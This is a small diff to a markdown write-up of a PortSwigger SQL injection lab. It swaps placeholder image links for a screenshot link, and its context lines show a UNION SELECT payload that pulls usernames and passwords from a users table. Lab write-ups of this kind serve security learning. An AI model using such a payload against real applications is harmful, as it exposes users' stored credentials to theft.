@@ -40,11 +40,7 @@ Since both the columns contain text data, we can retreive username and password 
 ```sql
 SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users --
 ```
-![image]()
-
-![image]()
-
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/11ea45b9dddf774464f9fdfcabc0bfd7ff41b3bb/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/User%20Details.png)
 
 Thus we got all the usernames & password stored in the database.
 
